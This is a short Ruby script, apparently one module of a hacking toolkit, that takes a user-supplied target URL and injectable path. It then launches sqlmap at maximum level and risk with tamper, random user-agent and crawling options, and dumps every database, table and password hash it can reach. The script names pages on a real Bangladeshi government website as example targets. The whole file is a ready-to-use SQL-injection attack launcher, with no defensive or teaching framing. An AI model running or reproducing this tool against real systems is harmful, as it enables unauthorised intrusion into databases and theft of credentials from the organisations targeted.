require 'colorize'
puts """
################################################################
##                                                            ##
##           Th3 M4d_Sc13nT15t is here to stay...             ##
##                                                            ##
##        We trust you have received the usual lecture        ##
##           from the local System Administrator.             ##
##                                                            ##
##     It usually boils down to these three things:           ##
##          #1) Respect the privacy of others.                ##
##         #2) Think before you type.                         ##
##        #3) With great power comes great responsibility.    ##
##                                                            ##
##            --->  SQL-INJECTION Module   <---               ##
##                                                            ##
################################################################
""".white

puts """
                        [Examples]

           www.bpc.gov.bd/news_details.php?id=22
            www.bpc.gov.bd/contactus.php?id=31
""".blue


puts """
                        [Some Hints] 
              [This Enabled For You By Default]

       In the case of continuous data retrieval problems, 
  You are advised to try a switch '--no-cast' or switch '--hex'

    If the character '>' is filtered by the back-end server. 
  You are strongly advised to rerun with the '--tamper=between'
""".light_blue

puts " [?] What is the target? ".blue
puts " [$] Url Or Ip ONLY, {No http needed} ".blue
print " [!] ---> ".yellow

target = gets.chomp

puts " [?] What is the SQL statement? ".blue
puts """ [$] Example: ---> /contactus.php?id=1 
                    : ---> /index.php?id=346
""".blue
print " [!] ---> ".yellow
sql = gets.chomp

puts """
                 [Just A Little Reminder] 

             You can find results of your scans 
  Inside one of the CSV files located: --> /root/.sqlmap/output/
""".light_blue

exec("sqlmap -u http://#{target}#{sql} --batch -v 3 --crawl=5 --level 3 --risk 3 --no-cast --tamper=between --random-agent --keep-alive --dump-all --schema --passwords --columns --tables --dbs --level 5 --risk 3 --threads 3 --delay=1 --timeout=15 --retries=2 --eta ")



